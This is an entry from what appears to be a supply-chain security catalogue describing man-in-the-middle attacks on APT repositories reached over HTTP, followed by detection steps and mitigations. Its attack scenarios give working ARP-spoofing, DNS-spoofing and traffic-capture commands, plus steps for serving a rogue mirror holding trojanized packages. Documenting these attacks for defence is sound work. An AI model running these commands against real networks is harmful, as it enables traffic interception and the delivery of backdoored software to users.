---
name: "APT Repository Man-in-the-Middle Attack"
packageManager: "apt"
slug: "apt-repo-mitm"
category: "Supply Chain"
severity: "medium"
platform:
  - "Linux"
description: "HTTP APT sources expose repository requests to observation, blocking, and redirection by a network attacker. On an authenticated repository, APT verifies the signed Release file, the hashes of Packages indexes, and the package hashes recorded in those indexes, so a network attacker cannot replace metadata or .deb files merely by intercepting HTTP. Package substitution requires an additional failure such as an explicitly trusted unsigned source, a compromised signing key, or a separate APT vulnerability."
descriptionCitations: [1, 2, 3, 4, 5, 6]
prerequisites:
  - "Network position allowing interception of traffic between the target and the APT repository (e.g., shared Wi-Fi, compromised router, ISP-level access, ARP spoofing)"
  - "The target system must have at least one APT source configured over HTTP (not HTTPS)"
  - "For package replacement: a separate authentication failure, such as trusted=yes, an accepted malicious signing key, or a vulnerable APT implementation"
prerequisitesCitations: [1, 2, 3, 4, 5, 6]
attackScenarios:
  - title: "Observing and Disrupting HTTP APT Traffic"
    description: "An attacker on the same network segment can redirect unencrypted HTTP traffic through their machine, observe requested repository paths, and block or delay downloads. Replacing a signed package causes APT's hash verification to fail unless another authentication weakness is present."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Identify HTTP-based APT sources on the target (reconnaissance)"
        code: |
          # Many default installations still use HTTP
          grep -r "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/
          # Common HTTP repos:
          # deb http://archive.ubuntu.com/ubuntu/ jammy main
          # deb http://security.ubuntu.com/ubuntu/ jammy-security main
        language: "bash"
      - label: "Set up ARP spoofing on the attacker machine"
        code: |
          # Enable IP forwarding
          echo 1 > /proc/sys/net/ipv4/ip_forward
          # ARP spoof to intercept traffic from target (192.168.1.100) to gateway (192.168.1.1)
          arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
          arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
        language: "bash"
      - label: "Observe repository requests over HTTP"
        code: |
          tcpdump -ni eth0 'host 192.168.1.100 and tcp port 80'
          # Request paths and timing are visible, but signed content remains authenticated.
        language: "bash"
  - title: "Rogue Mirror Against an Explicitly Insecure Source"
    description: "DNS or routing manipulation can redirect an HTTP source to a rogue mirror, but modern APT rejects its unsigned Release metadata by default. The substitution succeeds only when the source is explicitly treated as trusted or insecure, or when the attacker controls an accepted repository signing key."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Set up a rogue DNS response for the repository hostname"
        code: |
          # Using ettercap for DNS spoofing
          echo "archive.ubuntu.com A 192.168.1.200" >> /etc/ettercap/etter.dns
          echo "security.ubuntu.com A 192.168.1.200" >> /etc/ettercap/etter.dns
          ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.100// /192.168.1.1//
        language: "bash"
      - label: "Host a malicious APT mirror on the attacker's server"
        code: |
          # Create a partial unsigned mirror for a lab demonstration.
          # A correctly configured APT client rejects this repository.
          mkdir -p /var/www/ubuntu/dists/jammy/main/binary-amd64/
          mkdir -p /var/www/ubuntu/pool/main/
          # Copy the trojanized .deb files to pool
          cp /tmp/backdoored-packages/*.deb /var/www/ubuntu/pool/main/
          # Generate Packages and Release files
          cd /var/www/ubuntu
          dpkg-scanpackages pool/ /dev/null | gzip > dists/jammy/main/binary-amd64/Packages.gz
          apt-ftparchive release dists/jammy/ > dists/jammy/Release
          # Start serving
          python3 -m http.server 80 --directory /var/www/ubuntu/
        language: "bash"
detection:
  - title: "Audit APT sources for HTTP usage"
    description: "Identify APT sources configured to use unencrypted HTTP. HTTP exposes requests to observation and disruption; APT repository authentication still protects package integrity when signature and freshness checks remain enabled."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Find all HTTP (non-HTTPS) APT sources
          grep -rn "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          # Count HTTP vs HTTPS sources
          echo "HTTP sources:"
          grep -rc "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          echo "HTTPS sources:"
          grep -rc "^deb https://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
        language: "bash"
  - title: "Detect ARP spoofing and network anomalies"
    description: "Monitor for ARP spoofing indicators that may signal an active MITM attack on the local network, particularly during apt-get operations."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Check for duplicate MAC addresses in ARP table (indicator of ARP spoofing)
          arp -a | awk '{print $4}' | sort | uniq -d
          # Monitor ARP table changes
          arpwatch -i eth0
          # Check for unexpected changes in package checksums after download
          apt-get download package-name 2>/dev/null && dpkg-deb --info package-name*.deb
        language: "bash"
  - title: "Verify package integrity post-download"
    description: "Confirm that downloaded package hashes match authenticated Packages metadata. APT performs this verification automatically for authenticated repositories; manual comparison can support incident response."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Verify package checksums against Release file
          apt-get download openssh-server 2>/dev/null
          sha256sum openssh-server*.deb
          # Compare against the hash in the repo metadata
          zcat /var/lib/apt/lists/*_Packages | grep -A5 "Package: openssh-server" | grep SHA256
        language: "bash"
mitigation:
  - "Prefer HTTPS sources to add transport confidentiality and reduce exposure to network injection vulnerabilities"
  - "On current APT releases HTTPS support is built in; apt-transport-https is only a transitional package"
  - "Ensure GPG signature verification is enabled and enforced for all repositories (never use trusted=yes with HTTP sources)"
  - "Keep signature and freshness checks enabled, including Check-Valid-Until for repositories that publish valid-until metadata"
  - "Deploy network-level protections against ARP spoofing (dynamic ARP inspection, static ARP entries for critical hosts)"
  - "Use a local APT caching proxy (apt-cacher-ng) with HTTPS upstream to reduce exposure on untrusted networks"
  - "Consider using Tor-based APT transport (apt-transport-tor) for additional anonymity and MITM resistance"
mitigationCitations: [1, 2, 3, 4, 5, 6]
references:
  - title: "Debian Wiki - SecureApt"
    url: "https://wiki.debian.org/SecureApt"
  - title: "apt-transport-https - Debian Package"
    url: "https://packages.debian.org/bookworm/apt-transport-https"
  - title: "A Systematic Analysis of the Security of APT Repositories (Academic Paper)"
    url: "https://arxiv.org/abs/2005.09535"
  - title: "Debian Wiki - AptTransportTor"
    url: "https://salsa.debian.org/apt-team/apt-transport-tor"
  - title: "apt-secure(8) - Archive Authentication"
    url: "https://manpages.debian.org/testing/apt/apt-secure.8.en.html"
  - title: "apt.conf(5) - Acquire Configuration"
    url: "https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html"
created: 2026-04-02
updated: 2026-10-14
---
